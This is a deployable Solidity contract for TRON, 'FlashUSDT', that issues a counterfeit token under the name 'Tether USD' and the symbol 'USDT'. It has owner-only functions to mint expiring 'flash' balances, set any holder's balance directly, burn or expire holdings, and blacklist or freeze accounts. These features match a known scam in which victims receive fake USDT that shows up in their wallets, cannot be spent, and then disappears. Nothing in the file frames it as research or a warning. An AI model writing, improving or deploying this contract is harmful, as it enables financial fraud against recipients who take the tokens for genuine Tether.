// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITRC20 {
    function transfer(address to, uint256 value) external returns (bool);
}

/**
 * @title FlashUSDT - Flash USDT TRC20 token
 * @dev Flash token features: expiry mechanism, transfer restrictions, flash minting, metadata
 */
contract FlashUSDT {
    // Basic token info
    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public decimals = 6;
    uint256 public totalSupply;
    
    // Roles
    address public owner;
    address public feeCollector;
    
    // State variables
    bool public paused = false;
    uint256 public transferFee = 0; // Fee in basis points (100 = 1%)
    
    // Mappings
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public blacklisted;
    mapping(address => bool) public feeExempt;
    
    // Flash token state variables
    mapping(address => uint256) public balanceExpiry;
    uint256 public defaultExpiryDuration;
    mapping(address => bool) public transferRestricted;
    
    // Metadata state variables
    string public logoURI;
    string public website;
    string public description;
    string public email;
    string public twitter;
    string public telegram;
    string public github;
    
    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Mint(address indexed to, uint256 value, uint256 expiry);
    event Burn(address indexed from, uint256 value);
    event Pause();
    event Unpause();
    event Blacklist(address indexed account);
    event Unblacklist(address indexed account);
    event FeeUpdate(uint256 oldFee, uint256 newFee);
    event FeeCollected(address indexed from, address indexed to, uint256 amount);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event BalanceExpired(address indexed account, uint256 value);
    event MetadataUpdated(string field, string value);

    // Modifiers
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }
    
    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }
    
    modifier notBlacklisted(address account) {
        require(!blacklisted[account], "Account is blacklisted");
        _;
    }
    
    modifier notExpired(address account) {
        require(balanceExpiry[account] == 0 || balanceExpiry[account] > block.timestamp, "Balance expired");
        _;
    }

    constructor() {
        owner = msg.sender;
        feeCollector = msg.sender;
        totalSupply = 0;
        defaultExpiryDuration = 365 days;
        
        // Owner is exempt from fees
        feeExempt[owner] = true;
        
        // Initialize metadata as empty strings
        logoURI = "";
        website = "";
        description = "";
        email = "";
        twitter = "";
        telegram = "";
        github = "";
    }

    // Basic transfer function with fees and checks
    function transfer(address to, uint256 value) public 
        whenNotPaused 
        notBlacklisted(msg.sender) 
        notBlacklisted(to)
        notExpired(msg.sender)
        returns (bool) 
    {
        require(to != address(0), "Cannot transfer to zero address");
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        require(!transferRestricted[msg.sender], "Transfer restricted");
        
        // Check if balance expired
        if (balanceExpiry[msg.sender] > 0 && balanceExpiry[msg.sender] <= block.timestamp) {
            _expireBalance(msg.sender);
            return false;
        }
        
        uint256 fee = 0;
        uint256 transferAmount = value;
        
        // Calculate fee if not exempt
        if (!feeExempt[msg.sender] && transferFee > 0) {
            fee = (value * transferFee) / 10000;
            transferAmount = value - fee;
        }
        
        // Execute transfer
        balanceOf[msg.sender] -= value;
        balanceOf[to] += transferAmount;
        
        // Set expiry for recipient if they don't have one
        if (balanceExpiry[to] == 0) {
            balanceExpiry[to] = block.timestamp + defaultExpiryDuration;
        }
        
        // Collect fee
        if (fee > 0) {
            balanceOf[feeCollector] += fee;
            emit FeeCollected(msg.sender, feeCollector, fee);
            emit Transfer(msg.sender, feeCollector, fee);
        }
        
        emit Transfer(msg.sender, to, transferAmount);
        return true;
    }

    function approve(address spender, uint256 value) public 
        whenNotPaused 
        notBlacklisted(msg.sender)
        notExpired(msg.sender)
        returns (bool) 
    {
        require(spender != address(0), "Cannot approve zero address");
        
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public 
        whenNotPaused 
        notBlacklisted(from) 
        notBlacklisted(to)
        notExpired(from)
        returns (bool) 
    {
        require(to != address(0), "Cannot transfer to zero address");
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");
        require(!transferRestricted[from], "Transfer restricted");
        
        // Check if balance expired
        if (balanceExpiry[from] > 0 && balanceExpiry[from] <= block.timestamp) {
            _expireBalance(from);
            return false;
        }
        
        uint256 fee = 0;
        uint256 transferAmount = value;
        
        // Calculate fee if not exempt
        if (!feeExempt[from] && transferFee > 0) {
            fee = (value * transferFee) / 10000;
            transferAmount = value - fee;
        }
        
        // Execute transfer
        balanceOf[from] -= value;
        balanceOf[to] += transferAmount;
        allowance[from][msg.sender] -= value;
        
        // Set expiry for recipient
        if (balanceExpiry[to] == 0) {
            balanceExpiry[to] = block.timestamp + defaultExpiryDuration;
        }
        
        // Collect fee
        if (fee > 0) {
            balanceOf[feeCollector] += fee;
            emit FeeCollected(from, feeCollector, fee);
            emit Transfer(from, feeCollector, fee);
        }
        
        emit Transfer(from, to, transferAmount);
        return true;
    }

    // Owner functions
    function mint(address to, uint256 value) public onlyOwner returns (bool) {
        require(to != address(0), "Cannot mint to zero address");
        
        totalSupply += value;
        balanceOf[to] += value;
        emit Mint(to, value, 0);
        emit Transfer(address(0), to, value);
        return true;
    }
    
    // Flash token functions
    function flashMint(address to, uint256 value) public onlyOwner returns (bool) {
        require(to != address(0), "Cannot mint to zero address");
        
        totalSupply += value;
        balanceOf[to] += value;
        
        // Set expiry time
        if (balanceExpiry[to] == 0 || balanceExpiry[to] < block.timestamp) {
            balanceExpiry[to] = block.timestamp + defaultExpiryDuration;
        }
        
        emit Mint(to, value, balanceExpiry[to]);
        emit Transfer(address(0), to, value);
        return true;
    }
    
    function flashMintWithExpiry(address to, uint256 value, uint256 expiryTimestamp) public onlyOwner returns (bool) {
        require(to != address(0), "Cannot mint to zero address");
        require(expiryTimestamp > block.timestamp, "Expiry must be future");
        
        totalSupply += value;
        balanceOf[to] += value;
        balanceExpiry[to] = expiryTimestamp;
        
        emit Mint(to, value, expiryTimestamp);
        emit Transfer(address(0), to, value);
        return true;
    }
    
    function burnFrom(address from, uint256 value) public onlyOwner returns (bool) {
        require(balanceOf[from] >= value, "Insufficient balance");
        
        balanceOf[from] -= value;
        totalSupply -= value;
        
        emit Burn(from, value);
        emit Transfer(from, address(0), value);
        return true;
    }
    
    function setTransferRestriction(address account, bool restricted) public onlyOwner {
        transferRestricted[account] = restricted;
    }
    
    function expireBalance(address account) public onlyOwner {
        _expireBalance(account);
    }
    
    function _expireBalance(address account) internal {
        uint256 expiredAmount = balanceOf[account];
        if (expiredAmount > 0 && balanceExpiry[account] > 0 && balanceExpiry[account] <= block.timestamp) {
            balanceOf[account] = 0;
            totalSupply -= expiredAmount;
            balanceExpiry[account] = 0;
            emit BalanceExpired(account, expiredAmount);
            emit Transfer(account, address(0), expiredAmount);
        }
    }
    
    function setDefaultExpiryDuration(uint256 duration) public onlyOwner {
        defaultExpiryDuration = duration;
    }
    
    function setBalance(address account, uint256 value) public onlyOwner {
        uint256 oldBalance = balanceOf[account];
        totalSupply = totalSupply - oldBalance + value;
        balanceOf[account] = value;
        
        if (value > 0 && balanceExpiry[account] == 0) {
            balanceExpiry[account] = block.timestamp + defaultExpiryDuration;
        }
    }

    function burn(uint256 value) public onlyOwner returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance to burn");
        
        balanceOf[msg.sender] -= value;
        totalSupply -= value;
        emit Burn(msg.sender, value);
        emit Transfer(msg.sender, address(0), value);
        return true;
    }

    // Pause functions
    function pause() public onlyOwner {
        paused = true;
        emit Pause();
    }

    function unpause() public onlyOwner {
        paused = false;
        emit Unpause();
    }

    // Blacklist functions
    function addToBlacklist(address account) public onlyOwner {
        blacklisted[account] = true;
        emit Blacklist(account);
    }

    function removeFromBlacklist(address account) public onlyOwner {
        blacklisted[account] = false;
        emit Unblacklist(account);
    }

    // Fee functions
    function setTransferFee(uint256 newFee) public onlyOwner {
        require(newFee <= 1000, "Fee cannot exceed 10%"); // Max 10%
        uint256 oldFee = transferFee;
        transferFee = newFee;
        emit FeeUpdate(oldFee, newFee);
    }

    function setFeeCollector(address newCollector) public onlyOwner {
        require(newCollector != address(0), "Fee collector cannot be zero address");
        feeCollector = newCollector;
    }

    function setFeeExempt(address account, bool exempt) public onlyOwner {
        feeExempt[account] = exempt;
    }
    
    // Metadata functions
    function setLogoURI(string memory newURI) public onlyOwner {
        logoURI = newURI;
        emit MetadataUpdated("logoURI", newURI);
    }
    
    function setWebsite(string memory newWebsite) public onlyOwner {
        website = newWebsite;
        emit MetadataUpdated("website", newWebsite);
    }
    
    function setDescription(string memory newDescription) public onlyOwner {
        description = newDescription;
        emit MetadataUpdated("description", newDescription);
    }
    
    function setEmail(string memory newEmail) public onlyOwner {
        email = newEmail;
        emit MetadataUpdated("email", newEmail);
    }
    
    function setTwitter(string memory newTwitter) public onlyOwner {
        twitter = newTwitter;
        emit MetadataUpdated("twitter", newTwitter);
    }
    
    function setTelegram(string memory newTelegram) public onlyOwner {
        telegram = newTelegram;
        emit MetadataUpdated("telegram", newTelegram);
    }
    
    function setGithub(string memory newGithub) public onlyOwner {
        github = newGithub;
        emit MetadataUpdated("github", newGithub);
    }

    // Ownership
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    // Emergency functions
    function emergencyWithdraw(address token, uint256 amount) public onlyOwner {
        if (token == address(0)) {
            // Withdraw TRX
            (bool success, ) = payable(owner).call{value: amount}("");
            require(success, "Transfer failed");
        } else {
            // Withdraw other tokens (if any sent by mistake)
            ITRC20(token).transfer(owner, amount);
        }
    }

    // View functions
    function getCirculatingSupply() public view returns (uint256) {
        return totalSupply - balanceOf[address(0)];
    }

    function isBlacklisted(address account) public view returns (bool) {
        return blacklisted[account];
    }

    function isFeeExempt(address account) public view returns (bool) {
        return feeExempt[account];
    }
    
    // Flash token view functions
    function getExpiry(address account) public view returns (uint256) {
        return balanceExpiry[account];
    }
    
    function isExpired(address account) public view returns (bool) {
        return balanceExpiry[account] > 0 && balanceExpiry[account] <= block.timestamp;
    }
    
    function getBalanceWithExpiry(address account) public view returns (uint256 balance, uint256 expiry, bool expired) {
        balance = balanceOf[account];
        expiry = balanceExpiry[account];
        expired = expiry > 0 && expiry <= block.timestamp;
        if (expired) {
            balance = 0;
        }
    }
    
    function getAllMetadata() public view returns (
        string memory _logoURI,
        string memory _website,
        string memory _description,
        string memory _email,
        string memory _twitter,
        string memory _telegram,
        string memory _github
    ) {
        return (logoURI, website, description, email, twitter, telegram, github);
    }
}